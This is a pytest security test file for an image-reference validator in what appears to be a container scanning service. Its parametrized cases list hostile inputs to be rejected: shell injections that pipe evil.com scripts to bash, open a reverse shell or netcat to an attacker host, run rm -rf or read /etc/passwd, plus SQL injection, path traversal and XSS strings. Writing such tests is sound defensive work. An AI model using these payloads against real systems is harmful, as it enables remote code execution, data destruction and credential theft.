"""
Unit tests for image reference validation.
Tests the _validate_image_reference method in scan_service.py

This is a SECURITY-CRITICAL test file that ensures malicious inputs
are properly rejected to prevent command injection and other attacks.
"""

import pytest


class TestImageReferenceValidation:
    """Tests for _validate_image_reference function."""

    # ========================================================================
    # Valid Image Reference Tests
    # ========================================================================

    @pytest.mark.parametrize("image_ref", [
        # Simple image names
        "nginx",
        "redis",
        "alpine",
        "ubuntu",
        "python",
        # Image with tag
        "nginx:latest",
        "nginx:1.24.0",
        "python:3.10-slim",
        "node:18-alpine",
        "redis:7.2.4",
        # Docker Hub official images
        "library/nginx:latest",
        "library/redis:7",
        # Docker Hub user images
        "myuser/myimage:v1.0.0",
        "organization/app:latest",
        # Full registry paths
        "docker.io/library/nginx:latest",
        "docker.io/myuser/myapp:v1",
        # GitHub Container Registry
        "ghcr.io/owner/repo:v1.0.0",
        "ghcr.io/myorg/myapp:sha-abc123",
        # Google Container Registry
        "gcr.io/project-id/image:tag",
        "gcr.io/google-samples/hello-app:1.0",
        # AWS ECR
        "123456789012.dkr.ecr.us-east-1.amazonaws.com/my-app:latest",
        # Azure Container Registry
        "myregistry.azurecr.io/myapp:v1",
        # Private registries
        "registry.example.com/app:latest",
        "registry.example.com:5000/app:latest",
        "192.168.1.100:5000/app:latest",
        # Tags with various formats
        "app:v1.2.3",
        "app:v1.2.3-beta",
        "app:v1.2.3-beta.1",
        "app:sha-abc123def",
        "app:20240115",
        # Underscores and dashes
        "my-app:latest",
        "my_app:latest",
        "my-app_name:v1.0",
    ])
    def test_valid_image_references(self, scanner, image_ref):
        """Valid image references should pass validation."""
        result = scanner._validate_image_reference(image_ref)
        assert result is True, f"Expected valid: {image_ref}"

    # ========================================================================
    # Invalid Format Tests
    # ========================================================================

    @pytest.mark.parametrize("image_ref,reason", [
        ("", "Empty string"),
        ("   ", "Whitespace only"),
        ("\t\n", "Tabs and newlines only"),
        ("#comment", "Comment line"),
        ("# nginx:latest", "Comment with image"),
    ])
    def test_empty_and_comment_inputs(self, scanner, image_ref, reason):
        """Empty strings and comments should be rejected."""
        result = scanner._validate_image_reference(image_ref)
        assert result is False, f"Should reject {reason}: {repr(image_ref)}"

    # ========================================================================
    # SECURITY: Command Injection Tests
    # ========================================================================

    @pytest.mark.security
    @pytest.mark.parametrize("image_ref", [
        # Semicolon injection
        "nginx; rm -rf /",
        "nginx;rm -rf /",
        "nginx ; id",
        # AND operator injection
        "nginx && cat /etc/passwd",
        "nginx&&whoami",
        "nginx && curl http://evil.com/shell.sh | bash",
        # OR operator injection
        "nginx || cat /etc/passwd",
        "nginx||whoami",
        # Pipe injection
        "nginx | nc attacker.com 1234",
        "nginx|cat /etc/passwd",
        "nginx | bash -i >& /dev/tcp/attacker/1234 0>&1",
        # Backtick command substitution
        "nginx`whoami`",
        "nginx`id`",
        "`rm -rf /`",
        # Dollar command substitution
        "nginx$(whoami)",
        "nginx$(id)",
        "$(curl http://evil.com/shell.sh)",
        # Newline injection
        "nginx\nrm -rf /",
        "nginx\r\nwhoami",
        "nginx\n\rcat /etc/passwd",
        # Null byte injection
        "nginx\x00; rm -rf /",
        # Quotes to break out
        "nginx'; rm -rf /'",
        'nginx"; rm -rf /"',
        "nginx`; rm -rf /`",
    ])
    def test_command_injection_rejected(self, scanner, image_ref):
        """Command injection attempts should be rejected."""
        result = scanner._validate_image_reference(image_ref)
        assert result is False, f"Should reject command injection: {repr(image_ref)}"

    # ========================================================================
    # SECURITY: SQL Injection Tests (defense in depth)
    # ========================================================================

    @pytest.mark.security
    @pytest.mark.parametrize("image_ref", [
        "nginx'; DROP TABLE scans;--",
        "nginx' OR '1'='1",
        'nginx" OR "1"="1',
        "nginx UNION SELECT * FROM users",
        "nginx'; INSERT INTO users VALUES('hacker');--",
        "nginx' AND 1=1--",
        "nginx'/**/OR/**/1=1",
    ])
    def test_sql_injection_rejected(self, scanner, image_ref):
        """SQL injection attempts should be rejected."""
        result = scanner._validate_image_reference(image_ref)
        assert result is False, f"Should reject SQL injection: {repr(image_ref)}"

    # ========================================================================
    # SECURITY: Path Traversal Tests
    # ========================================================================

    @pytest.mark.security
    @pytest.mark.parametrize("image_ref", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "/etc/shadow",
        "file:///etc/passwd",
        "file://localhost/etc/passwd",
        "....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
    ])
    def test_path_traversal_rejected(self, scanner, image_ref):
        """Path traversal attempts should be rejected."""
        result = scanner._validate_image_reference(image_ref)
        assert result is False, f"Should reject path traversal: {repr(image_ref)}"

    # ========================================================================
    # SECURITY: Special Character Tests
    # ========================================================================

    @pytest.mark.security
    @pytest.mark.parametrize("image_ref", [
        # Various dangerous characters
        "nginx<script>alert(1)</script>",
        "nginx>output.txt",
        "nginx{test}",
        "nginx[test]",
        "nginx(test)",
        "nginx!test",
        # Note: @ is allowed for digest format (e.g., nginx@sha256:abc123)
        "nginx#test",
        "nginx$test",
        "nginx%test",
        "nginx^test",
        "nginx&test",
        "nginx*test",
        "nginx=test",
        "nginx+test",
        "nginx~test",
        "nginx`test",
        "nginx'test",
        'nginx"test',
        "nginx\\test",
        "nginx|test",
        "nginx?test",
        "nginx;test",
        # Control characters
        "nginx\x00test",
        "nginx\x01test",
        "nginx\x1btest",  # ESC
        "nginx\x7ftest",  # DEL
    ])
    def test_special_characters_rejected(self, scanner, image_ref):
        """Special and control characters should be rejected."""
        result = scanner._validate_image_reference(image_ref)
        assert result is False, f"Should reject special chars: {repr(image_ref)}"

    # ========================================================================
    # SECURITY: Oversized Input Tests
    # ========================================================================

    @pytest.mark.security
    def test_oversized_image_name(self, scanner):
        """Excessively long image names should be handled."""
        long_name = "a" * 10000
        # Should either reject or handle gracefully (no crash)
        try:
            result = scanner._validate_image_reference(long_name)
            # If it returns, should be False for invalid format
            # (real image names are not this long)
        except Exception:
            pass  # Exception is acceptable for defense

    @pytest.mark.security
    def test_oversized_tag(self, scanner):
        """Excessively long tags should be handled."""
        long_tag = "nginx:" + "a" * 5000
        try:
            result = scanner._validate_image_reference(long_tag)
        except Exception:
            pass  # Exception is acceptable

    # ========================================================================
    # Edge Case Tests
    # ========================================================================

    def test_whitespace_trimming(self, scanner):
        """Image references with leading/trailing whitespace should be trimmed."""
        result = scanner._validate_image_reference("  nginx:latest  ")
        assert result is True

    def test_only_tag_rejected(self, scanner):
        """Tag-only references should be rejected."""
        result = scanner._validate_image_reference(":latest")
        assert result is False

    def test_double_colon_rejected(self, scanner):
        """Double colons should be rejected."""
        result = scanner._validate_image_reference("nginx::latest")
        assert result is False

    def test_empty_tag_rejected(self, scanner):
        """Empty tags should be rejected."""
        result = scanner._validate_image_reference("nginx:")
        assert result is False

    def test_multiple_at_signs(self, scanner):
        """Multiple @ signs (digest format edge case)."""
        # Valid digest format
        result = scanner._validate_image_reference("nginx@sha256:abc123")
        # May or may not be valid depending on implementation
        # Just ensure no crash


class TestImageValidationIntegration:
    """Integration tests for image validation in scan flow."""

    def test_validation_called_before_scan(self, scanner, mock_subprocess):
        """Validation should be called before any subprocess execution."""
        import asyncio

        # Attempt to scan malicious image
        async def run_test():
            result = await scanner._scan_single_image(
                "test-scan-id",
                "nginx; rm -rf /",
                "/tmp"
            )
            return result

        result = asyncio.get_event_loop().run_until_complete(run_test())

        # Should return None (rejected) without executing subprocess
        assert result is None
        # mock_subprocess should NOT have been called with the malicious command
